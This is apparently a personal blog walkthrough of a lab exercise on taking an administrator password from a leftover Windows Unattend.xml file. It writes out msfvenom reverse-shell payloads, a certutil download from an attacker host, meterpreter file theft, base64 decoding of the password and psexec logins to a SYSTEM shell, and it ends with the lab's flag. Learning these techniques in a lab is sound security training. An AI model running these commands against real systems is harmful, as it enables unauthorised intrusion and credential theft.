---
layout: post
title: "Searching For Passwords In Windows Configuration Files"
date: "2022-10-06"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Searching For Passwords In Windows Configuration Files（在 Windows 配置文件中搜索密码）
## Windows 配置文件
Windows 可以自动执行各种重复性任务，例如在许多系统上大规模推出或安装 Windows。

这通常通过使用无人参与的 Windows 安装实用程序来完成，该实用程序用于自动在系统上大规模安装/部署 Windows。

此工具使用包含特定配置和用户帐户凭据的配置文件，特别是管理员帐户的密码。

如果无人参与的 Windows 安装程序配置文件在安装后留在目标系统上，它们可能会泄露用户帐户凭据，攻击者可以使用这些凭据对 Windows 目标进行合法身份验证。

## 无人参与的 Windows 安装程序
无人参与 Windows 安装实用程序通常会使用以下包含用户帐户和系统配置信息的配置文件之一：

`C:\Windows\Panther\Unattend.xml`

`C:\Windows\Panther\Autounattend.xml`

# Demo: Searching For Passwords In Windows Configuration Files（演示：在 Windows 配置文件中搜索密码）
```
Target Machine IP Address: 10.2.27.165
```

1. gain initial access to the target system.
2. obtain a meterpreter session.
3. Use the meterpreter session to find the `Unattend.xml` file.
4. Identify the password.
5. Decode it with base64 utility.
6. Authenticate with target via `Psexec`.

First, gain initial access to the target system.

The target is 64 bit version of Windows server, and we currentlt have accessed to unprivileged user.

```
C:\Users\student>net user

User accounts for \\PRIV-ESC

--------------------------------------------------------------------
Administrator           DefaultAccount          Guest
student                 WDAGUtilityAccount
The command completed successfully.

C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                         State
======================          ==================================  ========
SeShutdownPrivilege             Shut down the system                Disabled
SeChangeNotifyPrivilege         Bypass traverse checking            Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set      Disabled
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
```

Set up a Web server to host the payload.exe file with python module SimpleHTTPServer.

```
python -m SimpleHTTPServer 80
```

Transfer it to target system:

`右键点击上边栏->Properties->Font->Size 24`

certutil is an inbuilt Windows utility that can be used to download file from the server.

```
C:\User\student>cd Desktop
C:\User\student\Desktop>certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
```

Back to Kail and shutdown the Web server.

```
service postgresql start && msfconsole

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST 10.10.5.2
run
```

在目标上执行payload.exe，获取meterpreter session.

```
meterpreter > sysinfo
meterpreter > search -f Unattend.xml
meterpreter > cd C:\\
meterpreter > cd Windows
meterpreter > cd Panther
meterpreter > dir
meterpreter > download unattend.xml
```

```
cat unattend.xml

<AutoLogon>
    <Password>
        <Value>QWRtaW5AMTIz</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>administrator</Username>
</AutoLogon>
```

```
vim password.txt

QWRtaW5AMTIz
```

```
base64 -d password.txt
Admin@123
```

We should get a command shell session:

```
psexec.py Administrator@10.2.27.165

Password: Admin@123

C:\Windows\system32>whoami
nt authority\system
```

I've been able to get access to the target system by finding legitimate Administrator's password with a Windows configuration files, more specifically, the unattended setup utilities configuration files.

# Unattended Installation（无人参与安装）
## 概述
提供给您的 Kali GUI 机器和 Windows 机器。 

您的任务是运行 PowerUp.ps1  Powershell 脚本来查找常见的 Windows 权限提升漏洞，该漏洞取决于错误配置。PowerSploit 后期开发框架已经在windows机器上提供给你了。

目标：以高权限访问meterpreter会话。

指示：

* 您可以通过在命令提示符下运行“ipconfig”命令来检查机器的 IP 地址，即 cmd.exe

* 不要攻击位于 IP 地址 10.0.0.1 的网关

## 我自己的思路
### 方法一
```
Target Machine IP Address: : 10.0.16.244
```

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.16.2  netmask 255.255.255.0  broadcast 10.10.16.255
        ether 02:42:0a:0a:10:02  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```
root@attackdefense:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

student账户权限很少。

```
C:\Users\student>net user

User accounts for \\PRIV-ESC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
student                  WDAGUtilityAccount
The command completed successfully.


C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

在目标主机上下载msfvenom生成的payload.exe。

```
C:\Users\student\Desktop>certutil -urlcache -f http://10.10.16.2/payload.exe payload.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

成功将payload.exe下载到student用户的桌面。

```
root@attackdefense:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.0.16.244 - - [05/Oct/2022 16:28:20] "GET /payload.exe HTTP/1.1" 200 -
10.0.16.244 - - [05/Oct/2022 16:28:20] "GET /payload.exe HTTP/1.1" 200 -

```

在Kali机器上启动msfconsole multi/handler模块：

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.16.2
LHOST => 10.10.16.2
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:1234
```

运行目标Windows桌面上的payload，获得meterpreter会话：

```
[*] Sending stage (201283 bytes) to 10.0.16.244
[*] Meterpreter session 1 opened (10.10.16.2:1234 -> 10.0.16.244:49783) at 2022-10-05 16:35:05 +0530

meterpreter > sysinfo
Computer        : PRIV-ESC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: PRIV-ESC\student
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege

```

在目标上搜索Unattend.xml文件：

**方法一：使用PowerUp.ps1模块的Invoke-AllChecks函数。**

[Advanced PowerUp.ps1 Usage](https://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f)

运行 PowerUp.ps1

在我们可以运行程序之前，我们需要将程序导入到当前会话中。我们通过运行以下命令之一来做到这一点：

```powershell
PS C:\> Import-Module PowerUp.ps1
PS C:\> . .\PowerUp.ps1
```

现在我们已经将模块导入到当前工作会话中，我们现在可以运行属于 PowerUp.ps1 模块的任何函数。我们最感兴趣的是Invoke-AllChecks，因为它运行模块中包含的所有检查。要运行它，我们只需运行该命令，如下所示：

```
PS C:\Users\student\Desktop\PowerSploit\Privesc> Import-Module .\PowerUp.ps1

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your
computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning
message. Do you want to run C:\Users\student\Desktop\PowerSploit\Privesc\PowerUp.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
PS C:\Users\student\Desktop\PowerSploit\Privesc> Invoke-AllChecks


ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

PowerUp.ps1将运行所有必需的检查并吐出很多东西。让我们看一下输出的一部分。如果您注意到`[*] Checking service permissions...`我们看到返回的服务可能存在漏洞。这是一些输出的细分。

* ServiceName：这是服务的名称
* Path：这是程序所在或运行的位置
* ModifiableFile：如果我们可以滥用此服务，这是将被修改的文件
* StartName：这是服务运行的身份。重要的是该用户拥有比我们当前权限更高的权限，否则利用它将毫无意义。通常我们希望它以LocalSystem或管理员权限运行。
* CanRestart：重要的是这是True。我们必须能够重新启动服务，否则无法进行更改以提升我们的权限。如果您有权重新启动机器，这是一个选项，但我们通常希望尽可能避免重新启动机器。
* AbuseFunction：如果我们按原样输入此命令，PowerUp.ps1将自动利用该服务并添加一个名为john的用户，其密码为Password123！到管理员组。（当然可以更改，但这是默认配置。）

**方法二：利用meterpreter的search查找文件**

[SEARCHING FOR CONTENT](https://www.offensive-security.com/metasploit-unleashed/searching-content/)

`-f` switch and tell it what filetype to look for.

```
meterpreter > search -f unattend.xml
Found 3 results...
    c:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml (5366 bytes)
    c:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml (5366 bytes)
    c:\Windows\Panther\unattend.xml (3519 bytes)
meterpreter > download c:\\Windows\\Panther\\unattend.xml
[*] Downloading: c:\Windows\Panther\unattend.xml -> unattend.xml
[*] Downloaded 3.44 KiB of 3.44 KiB (100.0%): c:\Windows\Panther\unattend.xml -> unattend.xml
[*] download   : c:\Windows\Panther\unattend.xml -> unattend.xml
```

```
root@attackdefense:~# cat unattend.xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <DriverPaths>
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                    <Path>$WinPEDriver$</Path>
                </PathAndCredentials>
            </DriverPaths>
        </component>
    </settings>
    <settings pass="specialize">
        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <RunSynchronous>
                <RunSynchronousCommand wcm:action="add">
                    <Order>1</Order>
                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
                </RunSynchronousCommand>
            </RunSynchronous>
        </component>
    </settings>
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <FirstLogonCommands>
              <SynchronousCommand wcm:action="add">
                <Description>AMD CCC Setup</Description>
                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
                <Order>1</Order>
                <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
              <SynchronousCommand wcm:action="add">
                  <Description>BootCamp setup</Description>
                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
                  <Order>2</Order>
                  <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
            </FirstLogonCommands>
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>

```


```
root@attackdefense:~# echo "QWRtaW5AMTIz" > password.txt
root@attackdefense:~# base64 -d password.txt 
Admin@123
```

得到以下用户名和密码：

```
administrator
Admin@123
```

```
root@attackdefense:~# find / -name psexec.py
find: '/proc/tty/driver': Permission denied
find: '/proc/213/map_files': Permission denied
find: '/proc/435/map_files': Permission denied
find: '/proc/437/map_files': Permission denied
find: '/proc/438/map_files': Permission denied
find: '/proc/439/map_files': Permission denied
find: '/proc/440/map_files': Permission denied
find: '/proc/441/map_files': Permission denied
find: '/proc/442/map_files': Permission denied
find: '/proc/465/map_files': Permission denied
find: '/proc/470/map_files': Permission denied
find: '/proc/529/map_files': Permission denied
find: '/proc/530/map_files': Permission denied
/usr/local/bin/psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
/usr/share/set/src/fasttrack/psexec.py
/opt/impacket/examples/psexec.py
```

```
root@attackdefense:~# cd /usr/local/bin/
root@attackdefense:/usr/local/bin# psexec.py administrator@10.0.16.244
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.0.16.244.....
[*] Found writable share ADMIN$
[*] Uploading file eqfocLkP.exe
[*] Opening SVCManager on 10.0.16.244.....
[*] Creating service Lqnx on 10.0.16.244.....
[*] Starting service Lqnx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

```

flag在`C:\Users\Administrator\Desktop`下：

```
C:\Windows\System32>cd \

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/27/2020  09:59 AM    <DIR>          Program Files
10/27/2020  10:02 AM    <DIR>          Program Files (x86)
10/27/2020  09:57 AM    <DIR>          Users
10/05/2022  11:27 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  15,788,568,576 bytes free

C:\>cd Users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users

10/27/2020  09:57 AM    <DIR>          .
10/27/2020  09:57 AM    <DIR>          ..
10/27/2020  09:44 AM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
10/27/2020  09:57 AM    <DIR>          student
               0 File(s)              0 bytes
               5 Dir(s)  15,788,568,576 bytes free

C:\Users>cd Administrator

C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator

10/27/2020  09:44 AM    <DIR>          .
10/27/2020  09:44 AM    <DIR>          ..
10/27/2020  09:44 AM    <DIR>          3D Objects
10/27/2020  09:44 AM    <DIR>          Contacts
11/07/2020  07:03 AM    <DIR>          Desktop
10/27/2020  09:57 AM    <DIR>          Documents
10/27/2020  10:32 AM    <DIR>          Downloads
10/27/2020  09:44 AM    <DIR>          Favorites
10/27/2020  09:44 AM    <DIR>          Links
10/27/2020  09:44 AM    <DIR>          Music
10/27/2020  09:44 AM    <DIR>          Pictures
10/27/2020  09:44 AM    <DIR>          Saved Games
10/27/2020  09:44 AM    <DIR>          Searches
10/27/2020  09:44 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  15,788,568,576 bytes free

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

11/07/2020  07:03 AM    <DIR>          .
11/07/2020  07:03 AM    <DIR>          ..
11/07/2020  07:03 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,788,568,576 bytes free

C:\Users\Administrator\Desktop>type flag.txt
097ab83639dce0ab3429cb0349493f60
C:\Users\Administrator\Desktop>whoami
nt authority\system

```

flag为：`097ab83639dce0ab3429cb0349493f60`

**或者是使用meterpreter中的psexec模块**
[PSEXEC PASS THE HASH](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

```
msf5 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_command                            normal     No     Microsoft Windows Authenticated Administration Utility
   2   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   3   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   4   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   5   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   6   encoder/x86/service                                           manual     No     Register Service
   7   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   8   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   11  exploit/windows/smb/psexec_psh               1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   12  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution


Interact with a module by name or index, for example use 12 or use exploit/windows/smb/webexec

msf5 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set LHOST 10.10.16.2
LHOST => 10.10.16.2
msf5 exploit(windows/smb/psexec) > set LPORT 4444
LPORT => 4444
msf5 exploit(windows/smb/psexec) > set RHOST 10.0.18.150
RHOST => 10.0.18.150
msf5 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf5 exploit(windows/smb/psexec) > set SMBPass Admin@123
SMBPass => Admin@123
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] 10.0.18.150:445 - Connecting to the server...
[*] 10.0.18.150:445 - Authenticating to 10.0.18.150:445 as user 'administrator'...
[*] 10.0.18.150:445 - Selecting PowerShell target
[*] 10.0.18.150:445 - Executing the payload...
[+] 10.0.18.150:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.0.18.150
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.18.150:49772) at 2022-10-05 21:23:32 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > search -f flag.txt
Found 2 results...
    c:\Documents and Settings\Administrator\Desktop\flag.txt (32 bytes)
    c:\Users\Administrator\Desktop\flag.txt (32 bytes)
meterpreter > cat c:\\Users\\Administrator\\Desktop\\flag.txt
097ab83639dce0ab3429cb0349493f60
```

## 解决方案
此实验室的解决方案可在以下手册中找到： https://assets.ine.com/labs/ad-manuals/walkthrough-2106.pdf

[Answer files (unattend.xml)](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11)

应答文件 (unattend.xml)

应答文件（或无人参与文件）可用于在安装期间修改你的映像中的 Windows 设置。 你还可以在映像中创建触发脚本的设置，在用户首次创建帐户并选择其默认语言后运行这些脚本。

Windows 安装程序将会自动搜索某些位置的应答文件，或者，你可以在运行 Windows 安装程序 (setup.exe) 时通过使用 /unattend: 选项来指定无人参与文件。

[HTA Web Server](https://www.rapid7.com/db/modules/exploit/windows/misc/hta_server/)

HTA 网络服务器

此模块托管一个 HTML 应用程序 (HTA)，打开时将通过 Powershell 运行有效负载。当用户导航到 HTA 文件时，IE 会在执行有效负载之前两次提示他们。